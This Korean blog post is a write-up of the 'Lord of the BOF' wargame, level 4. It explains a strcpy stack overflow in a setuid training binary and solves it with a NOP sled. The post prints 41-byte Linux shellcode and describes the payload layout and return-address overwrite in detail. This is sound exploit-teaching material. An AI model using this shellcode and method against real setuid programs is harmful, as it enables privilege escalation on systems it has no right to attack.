---
title: BOF/ LOB-level4(goblin)
tags: LOB
---

LOB란 The Lord of the BOF의 약자로 Buffer over-flow를 연습해 볼 수 있는 해킹문제이다.    
총 20문제로 구성되어 있으며 각 문제를 격파하여 다음 레벨의 패스워드를 얻는 형식입니다.  
문제를 격파하고 다음 레벨의 bash를 획득하였다면 my-pass로 패스워드를 확인할 수 있습니다.  

 [send me email](mailto:jewel7492@gmail.com) if you have any questions.

<!--more-->

---
### LOB Level 4(gremlin)
**ID : goblin**  
**PASSWD : hackers proof**         

```bash
$ bash2
```
풀이 시작 전에 bash2로 꼭 변경  
**bash는 \xff를 \x00(NULL)로 인식하여 제대로 문제를 풀 수 없다.**  

![그림1](/assets/LOB/level4/1.PNG)  
사용자 orc의 권한의 orc파일이 있음을 확인할 수 있다.  
**set-uid가 걸려있으므로 사용자 orc의 권한으로 파일을 실행할 수 있다.**  
**orc파일이 쉘을 실행시키도록 한다면 사용자 orc의 쉘을 획득할 수 있다.**  

<br />
{% highlight C linenos %}  
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orc
        - egghunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}

{% endhighlight %}  

**cobolt.c**

### 소스분석  
1. argc가 2보다 작다면 "ergv error"을 출력하고 프로그램을 종료한다.  
**argc란? - 파라미터의 개수를 의미한다. 즉 main에 최소 2개이상의 인자를 전달하여야 한다.**  
2. 환경변수를 memset으로 초기화  
**환경변수를 이용한 공격 불가**  
3. argv[1][47]의 값이 \xbf가 아닌경우 "stack is still your friend" 출력 후 프로그램 종료  
**RTL기법 사용 불가 What is RTL? - [LOB(level13)](https://limjunho.github.io/2020/03/14/LOB-level13(darkknight).html)**  
4. main에 전달받은 인자 argv[1](argv[0]은 파일명)을 buffer에 복사하여 출력하는 소스  
**strcpy함수는 복사할 데이터의 크기제한이 없기 때문에 argv[1]이 40Byte보다 크다면 buffer-overflow가 발생하는 취약점이 있다.**  

### Solution  
**[LOB(level1)](https://limjunho.github.io/2019/09/29/LOB-level1(gate).html)와 같이 buffer의 주소를 구해서 풀이하는 방법이 있다.**  
**이 포스팅에서는 NOP sled기법을 이용해 풀이**  

what is NOP sled? - NOP는 No-OPeration의 약자로 말 그대로 실행할 명령어가 없어 다음 명령어로 넘어간다.  
여기에 Sled(썰매)를 붙인 말로 고의적으로 실행흐름을 흘려 보내는 기법이다.  

Why use NOP Sled?  
임의의 메모리를 참조하게 되면 해당 위치에 무조건 악의적인 행위를 실행 하는 코드가 있을 수만은 없다.  
**gdb를 이용하여 디버깅을 하게 되면 한번 복사되어 들아가기 때문에 실제 프로세스 주소와 차이가 있다.**  
그래서 NOP Sled를 이용하면 RET에 변조한 주소에 악성코드가 없으면 자연스럽게 실행흐름을 타고 내려가 악성코드를 포함하고 있는 위치로 가게 되는 것이다.  

#### level4에서 사용한 쉘코드  
**\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80**  
이 41Byte 쉘코드는 /bin/bash를 실행시키도록 하는 코드이다.  

**buffer over-flow를 이용하기 위해서는 프로그램 Stack의 구조를 알아야 한다.**  

스택구조|
---|
buffer(40Byte)|
sfp(4Byte)|
ret(4Byte)| 

**SFP(Stack frame pointer) - 이전 함수의 EBP주소를 담고 있다.**  
(EBP - 스택의 가장 바닥을 가리키는 포인터)  
**RET(Return Address) - 함수가 종료시 return될 주소**  

#### argc가 2개미만의 경우에만 err를 발생시키기 때문에 이를 취약점으로 이용.  
**argv[2]에 많은양의 NOP과 쉘코드를 전달하고 적당한 NOP의 주소를 RET에 변조**  

### disassemble  

**쉘코드의 주소를 정확히 몰라도 적당히 NOP이 있는 주소를 알면 쉘코드가 실행될 것이기 때문에 NOP의 주소를 얻기 위해 디버깅을 한다.**  
권한문제가 없도록 orc를 복사하고 gdb를 사용하여 intel방식으로 디스어셈블 한다.  
![그림2](/assets/LOB/level4/2.PNG)  
disassemble 결과

![그림3](/assets/LOB/level4/3.PNG)  
**NOP이 있는 곳의 주소를 확인하기 위해 main함수의 종료 전에 BreakPoint를 걸고 첫 번째 인자로는 A 44개와 \xbf\xbf\xbf\xbf, 두 번째 인자로는 200개의 NOP과 B를 41개 전달한다.**   

esp - 스택의 최상단을 가리키는 포인터  
**b - break명령, r - run명령, x/[범위]wx - 메모리 상태 검사명령(주소 범위 만큼 16진수로 4Byte단위로 출력)**   

![그림4](/assets/LOB/level4/4.PNG) 
**두 번째 인자로 전달한 NOP과 B의 ascii값 42를 확인할 수 있다. -> 적당히 NOP이 들어있는 중간주소 = 0xbffffbc8**  

### Attack  

NOP의 주소와 스택의 구조를 파악하였으므로 공격을 시도할 수 있다.  
**./orc [dummy] + [NOP주소] [NOP] + [shellcode]**의 형태로 공격.  
**이 때 dummy값의 길이는 buffer의 길이 + sfp(4byte)만큼 즉 44Byte여야 한다.**
**또한 RET에 덮을 NOP의 주소는 리틀 엔디안 방식으로 기입한다.**  

**리틀 엔디안은 최 하위 바이트 부터 저장하는 방식이다.**  
ex) 0xbffffc11을 리틀 엔디안 방식으로 저장하면 11cfffbf가 된다.  
보통 엔디안 방식은 CPU 아키텍쳐에 따라 다르지만 intel x86, x64, AMD 계열은 리틀엔디안, 모토로라 프로세서들은 빅엔디안을 사용한다.  
현재 시스템의 엔디안방식을 확인하고 싶다면 echo -n I | od -to2 | head -n1 | awk'{print $2;}' | cut -c6  
명령으로 나오는 값이 1이라면 리틀 엔디안, 0이라면 빅엔디안이다.  

![그림4](/assets/LOB/level4/5.PNG)  
공격 성공.   